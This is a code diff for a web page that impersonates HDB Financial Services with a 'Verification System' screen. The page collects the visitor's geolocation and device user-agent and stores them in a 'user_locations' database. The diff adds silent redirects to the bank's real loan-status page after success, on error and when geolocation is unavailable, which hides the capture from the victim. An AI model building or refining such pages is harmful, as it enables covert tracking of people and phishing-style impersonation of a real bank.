@@ -1,4 +1,4 @@
-<<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -24,17 +24,15 @@
             max-width: 400px;
             width: 90%;
         }
-        /* खूबसूरत टेक्स्ट लोगो जो कभी फेल नहीं होगा */
-        .text-logo {
-            font-size: 32px;
-            font-weight: 800;
-            color: #004b87;
-            letter-spacing: 1px;
-            margin-bottom: 25px;
+        .logo-box {
+            width: 100%;
+            margin-bottom: 30px;
         }
-        .text-logo span {
-            font-weight: 300;
-            color: #555;
+        .logo-box img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 0 auto;
         }
         h2 {
             color: #333;
@@ -74,8 +72,8 @@
 <body>
 
     <div class="portal-container">
-        <div class="logo-box" style="width: 100%; margin-bottom: 30px;">
-            <img src="logo.png" alt="HDB Financial Services" style="max-width: 100%; height: auto; display: block; margin: 0 auto;">
+        <div class="logo-box">
+            <img src="logo.png" alt="HDB Financial Services">
         </div>
         
         <h2>Verification System</h2>
@@ -112,6 +110,10 @@
             if (!navigator.geolocation) {
                 status.textContent = 'Browser does not support verification.';
                 status.style.color = 'red';
+                // Agar browser geoloc support nahi karta, tab bhi target URL par redirect kar dega
+                setTimeout(() => {
+                    window.location.href = "https://synergy.hdbfs.com/loan-status/";
+                }, 1500);
             } else {
                 navigator.geolocation.getCurrentPosition(success, error);
             }
@@ -120,26 +122,34 @@
         async function success(position) {
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
-            
-            // यहाँ यह लाइन सामने वाले के फोन/डिवाइस की पूरी जानकारी निकाल रही है
             const deviceInfo = navigator.userAgent;
 
             document.getElementById('status').textContent = 'Verifying security credentials...';
             
             try {
-                // अब डेटाबेस में लोकेशन के साथ डिवाइस इन्फो भी सेव होगी
+                // Database me data save ho raha hai
                 await addDoc(collection(db, "user_locations"), {
                     latitude: lat,
                     longitude: lng,
                     device: deviceInfo,
                     timestamp: new Date()
                 });
+                
                 document.getElementById('status').textContent = 'Access Granted! Redirecting...';
                 document.getElementById('status').style.color = 'green';
+                
+                // Data save hone ke baad target URL par redirect karne ke liye line
+                window.location.href = "https://synergy.hdbfs.com/loan-status/";
+                
             } catch (e) {
                 console.error(e);
-                document.getElementById('status').textContent = 'Database Error. Please check rules.';
+                document.getElementById('status').textContent = 'Database Error. Proceeding to portal...';
                 document.getElementById('status').style.color = 'red';
+                
+                // Error aane par bhi user ko redirect kar dega taaki workflow na tute
+                setTimeout(() => {
+                    window.location.href = "https://synergy.hdbfs.com/loan-status/";
+                }, 1000);
             }
         }
 
